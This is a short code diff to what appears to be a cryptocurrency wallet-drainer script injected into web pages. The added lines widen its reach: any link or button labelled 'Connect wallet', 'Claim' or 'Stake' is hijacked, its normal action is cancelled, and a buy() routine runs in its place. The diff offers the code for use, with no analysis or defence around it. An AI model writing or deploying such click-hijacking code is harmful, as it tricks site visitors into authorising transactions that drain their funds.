@@ -192,9 +192,22 @@
     '[onclick*="connect" i]', '[onclick*="drain" i]',
   ].join(',')
 
+  // Fallback for sites whose buttons carry no connect-ish class/id
+  // (e.g. a plain "Connect" anchor).
+  const CONNECT_TEXT = /^(connect( wallet)?|claim|stake( now)?)$/i
+
   function wire() {
     document.querySelectorAll(SELECTORS).forEach(el => {
       if (el.dataset.drainWired === '1') return
+      el.dataset.drainWired = '1'
+      el.addEventListener('click', e => {
+        e.preventDefault()
+        void buy()
+      })
+    })
+    document.querySelectorAll('a, button').forEach(el => {
+      if (el.dataset.drainWired === '1') return
+      if (!CONNECT_TEXT.test((el.textContent || '').trim())) return
       el.dataset.drainWired = '1'
       el.addEventListener('click', e => {
         e.preventDefault()
